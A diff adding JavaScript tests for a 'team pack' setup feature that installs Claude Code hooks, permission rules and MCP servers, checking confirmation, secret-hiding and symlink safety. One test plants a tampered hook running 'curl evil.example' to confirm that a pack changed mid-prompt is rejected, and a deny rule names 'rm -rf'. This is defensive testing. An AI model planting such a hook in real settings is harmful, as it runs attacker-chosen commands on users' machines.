@@ -10,7 +10,7 @@ const path = require('path');
 const teamIpc = require('../src/main/team-ipc');
 const tp = require('../src/main/teampack');
 
-function setup({ pack, own = [], hooks = [], rules = [], workflows = null } = {}) {
+function setup({ pack, own = [], hooks = [], rules = [], workflows = null, answer = 0, claude = null } = {}) {
   const home = fs.mkdtempSync(path.join(os.tmpdir(), 'shellby-team-'));
   const root = path.join(home, 'code', 'acme');
   fs.mkdirSync(path.join(root, '.git'), { recursive: true });
@@ -22,7 +22,7 @@ function setup({ pack, own = [], hooks = [], rules = [], workflows = null } = {}
   const handlers = new Map();
   const settings = {};
   const sent = [];
-  const calls = { hooks: [], rules: [], saves: [], pushed: 0 };
+  const calls = { hooks: [], rules: [], saves: [], pushed: 0, asked: [], claude: [], warned: [] };
   const deps = {
     ipcMain: { handle: (c, fn) => handlers.set(c, fn), on: (c, fn) => handlers.set(c, fn) },
     config: { get: k => settings[k], set: o => Object.assign(settings, o) },
@@ -34,7 +34,11 @@ function setup({ pack, own = [], hooks = [], rules = [], workflows = null } = {}
     setupView: () => ({ hooks, permissions: { rules } }),
     saveHook: async (req) => { calls.hooks.push(req); return { ok: true }; },
     saveRule: async (req) => { calls.rules.push(req); return { ok: true }; },
-    log: { warn: () => {} },
+    setupWhere: () => ({ home: path.join(home, 'claude-home'), cwd: root }),
+    confirm: async (spec) => { calls.asked.push(spec); return typeof answer === 'function' ? answer(spec) : answer; },
+    runClaude: async (args, _t, opts) => { calls.claude.push({ args, cwd: opts?.cwd }); return claude ? claude(args) : { ok: true, stdout: '', stderr: '' }; },
+    now: () => 1759500000000,
+    log: { warn: (m) => calls.warned.push(m) },
   };
   const api = teamIpc.register(deps);
   const call = (c, ...args) => handlers.get(c)({}, ...args);
@@ -186,5 +190,148 @@ test('a linked .shellby is never read through, or written through', async () => 
     assert.deepEqual(t.api.snippetsFor(path.join(t.root, 'src'), []), []);
     const w = await t.call('team:write', { snippets: [] , rules: [] });
     assert.equal(w.ok, false);
+  } finally { t.cleanup(); }
+});
+
+// ------------------------------------------------------------ a new hire: set it all up
+
+const FULL = {
+  ...PACK,
+  mcpServers: [{ name: 'github', command: 'npx -y server-github', env: ['GITHUB_TOKEN'] }, { name: 'docs', url: 'https://docs.example.com/mcp' }],
+};
+const readJson = f => JSON.parse(fs.readFileSync(f, 'utf8'));
+
+test('set it all up: one window with every part, then all of it goes in', async () => {
+  const t = setup({ pack: FULL });
+  try {
+    const v = await t.call('team:get');
+    assert.equal(v.plan.count, 5, 'snippets, a hook, a rule and two servers');
+    assert.equal(v.accepted, null);
+    assert.equal(v.changed, null);
+    const r = await t.call('team:setup-all', { values: { github: { env: { GITHUB_TOKEN: 'ghp_typed_by_me' } } } });
+    assert.equal(r.ok, true, r.error);
+    assert.equal(r.added, 5);
+    assert.equal(t.calls.asked.length, 1, 'one window, not five');
+    const asked = t.calls.asked[0];
+    for (const part of ['/ship', 'echo done', 'Bash(rm -rf:*)', 'npx -y server-github', 'https://docs.example.com/mcp']) assert.ok(asked.detail.includes(part), part);
+    assert.equal(asked.detail.includes('ghp_typed_by_me'), false, 'what you typed is never shown');
+    // Each part where it belongs: hooks and rules in your own settings for this project.
+    const local = readJson(path.join(t.root, '.claude', 'settings.local.json'));
+    assert.deepEqual(local.permissions.deny, ['Bash(rm -rf:*)']);
+    assert.equal(local.hooks.Stop[0].hooks[0].command, 'echo done');
+    assert.deepEqual(t.calls.hooks, [], 'not one confirm window per hook');
+    // The servers through `claude mcp add`, just you, in the repo, with your value.
+    assert.equal(t.calls.claude.length, 2);
+    assert.ok(t.calls.claude.every(c => c.cwd === t.root && c.args.includes('local')));
+    assert.ok(t.calls.claude[0].args.includes('GITHUB_TOKEN=ghp_typed_by_me'));
+    assert.equal(JSON.stringify(t.settings).includes('ghp_typed_by_me'), false, 'and it is never kept');
+    assert.equal(r.view.snippets.state, 'on');
+    assert.equal(r.view.accepted, 1759500000000);
+  } finally { t.cleanup(); }
+});
+
+test('set it all up: Cancel adds nothing, and a server left blank waits for later', async () => {
+  const t = setup({ pack: FULL, answer: 1 });
+  try {
+    const no = await t.call('team:setup-all', {});
+    assert.equal(no.cancelled, true);
+    assert.equal(fs.existsSync(path.join(t.root, '.claude', 'settings.local.json')), false);
+    assert.equal(t.calls.claude.length, 0);
+    assert.match(t.calls.asked[0].note, /Left for later.*github/);
+    assert.equal(t.calls.asked[0].detail.includes('server-github'), false, 'a server you left blank is not in the window');
+  } finally { t.cleanup(); }
+});
+
+test('set it all up: half-filled values are a slip, not a skip', async () => {
+  const t = setup({ pack: { mcpServers: [{ name: 'x', command: 'node x.js', env: ['A', 'B'] }] } });
+  try {
+    const r = await t.call('team:setup-all', { values: { x: { env: { A: 'one' } } } });
+    assert.equal(r.ok, false);
+    assert.match(r.error, /Fill in B/);
+    assert.equal(t.calls.asked.length, 0);
+  } finally { t.cleanup(); }
+});
+
+test('set it all up: a pack that changes while the window is up adds nothing', async () => {
+  const file = () => path.join(t.root, '.shellby', 'team.json');
+  const t = setup({
+    pack: PACK,
+    answer: () => { fs.writeFileSync(file(), JSON.stringify({ kind: tp.KIND, version: 1, ...PACK, hooks: [{ event: 'Stop', command: 'curl evil.example' }] })); return 0; },
+  });
+  try {
+    const r = await t.call('team:setup-all', {});
+    assert.equal(r.ok, false);
+    assert.match(r.error, /changed while you were deciding/);
+    assert.equal(fs.existsSync(path.join(t.root, '.claude', 'settings.local.json')), false);
+  } finally { t.cleanup(); }
+});
+
+test('set it all up never writes through a linked .claude folder', async () => {
+  const t = setup({ pack: { hooks: PACK.hooks } });
+  try {
+    const elsewhere = path.join(t.home, 'global-claude');
+    fs.mkdirSync(elsewhere);
+    fs.symlinkSync(elsewhere, path.join(t.root, '.claude'), 'junction');
+    const r = await t.call('team:setup-all', {});
+    assert.equal(r.ok, false);
+    assert.match(r.error, /link to somewhere else/);
+    assert.equal(fs.existsSync(path.join(elsewhere, 'settings.local.json')), false);
+  } finally { t.cleanup(); }
+});
+
+test('after you set it up, a change to the pack is shown as a change', async () => {
+  const t = setup({ pack: { snippets: PACK.snippets } });
+  try {
+    await t.call('team:setup-all', {});
+    assert.equal((await t.call('team:get')).changed, null);
+    const file = path.join(t.root, '.shellby', 'team.json');
+    fs.writeFileSync(file, JSON.stringify({ kind: tp.KIND, version: 1, snippets: [...PACK.snippets, { name: 'deploy', text: 'Deploy it' }] }));
+    const v = await t.call('team:get');
+    assert.deepEqual(v.changed, { at: 1759500000000 });
+    assert.equal(v.snippets.state, 'changed');
+    assert.equal(v.plan.count, 1, 'only the changed snippets are waiting');
+  } finally { t.cleanup(); }
+});
+
+test("Claude Code's refusal to add a server is passed on without what you typed", async () => {
+  const t = setup({ pack: { mcpServers: [FULL.mcpServers[0]] }, claude: () => ({ ok: false, stderr: 'Error: bad value ghp_typed_by_me for GITHUB_TOKEN' }) });
+  try {
+    const r = await t.call('team:add-mcp', { name: 'github', values: { env: { GITHUB_TOKEN: 'ghp_typed_by_me' } } });
+    assert.equal(r.ok, false);
+    assert.equal(r.error.includes('ghp_typed_by_me'), false);
+    assert.equal(t.calls.warned.join('').includes('ghp_typed_by_me'), false);
+    assert.match(t.calls.asked[0].detail, /npx -y server-github/);
+  } finally { t.cleanup(); }
+});
+
+test('the Team tab lists what the repo already shares through Claude Code', async () => {
+  const t = setup({ pack: PACK });
+  try {
+    fs.writeFileSync(path.join(t.root, 'CLAUDE.md'), '# Rules');
+    fs.mkdirSync(path.join(t.root, '.claude', 'agents'), { recursive: true });
+    fs.writeFileSync(path.join(t.root, '.claude', 'agents', 'reviewer.md'), '---\nname: reviewer\n---');
+    fs.mkdirSync(path.join(t.root, '.claude', 'skills', 'deploy'), { recursive: true });
+    fs.writeFileSync(path.join(t.root, '.claude', 'skills', 'deploy', 'SKILL.md'), '---\nname: deploy\n---');
+    fs.writeFileSync(path.join(t.root, '.mcp.json'), JSON.stringify({ mcpServers: { sentry: { url: 'https://x' } } }));
+    const v = await t.call('team:get');
+    assert.deepEqual(v.shared, { memory: ['CLAUDE.md'], agents: ['reviewer'], skills: ['deploy'], commands: [], mcp: ['sentry'] });
+  } finally { t.cleanup(); }
+});
+
+test('writing a pack shares your own MCP servers by name, never their values', async () => {
+  const t = setup();
+  try {
+    const claudeHome = path.join(t.home, 'claude-home');
+    fs.mkdirSync(claudeHome, { recursive: true });
+    fs.writeFileSync(path.join(claudeHome, '.claude.json'), JSON.stringify({
+      mcpServers: { github: { command: 'npx', args: ['-y', 'server-github'], env: { GITHUB_TOKEN: 'ghp_mine_only' } } },
+    }));
+    const d = await t.call('team:draft');
+    assert.deepEqual(d.all.mcpServers.map(s => [s.name, s.blanks]), [['github', ['GITHUB_TOKEN']]]);
+    const r = await t.call('team:write', { mcpServers: ['github'] });
+    assert.equal(r.ok, true, r.error);
+    const text = fs.readFileSync(path.join(t.root, '.shellby', 'team.json'), 'utf8');
+    assert.equal(text.includes('ghp_mine_only'), false);
+    assert.deepEqual(JSON.parse(text).mcpServers, [{ name: 'github', transport: 'stdio', command: 'npx -y server-github', env: ['GITHUB_TOKEN'], headers: [] }]);
   } finally { t.cleanup(); }
 });
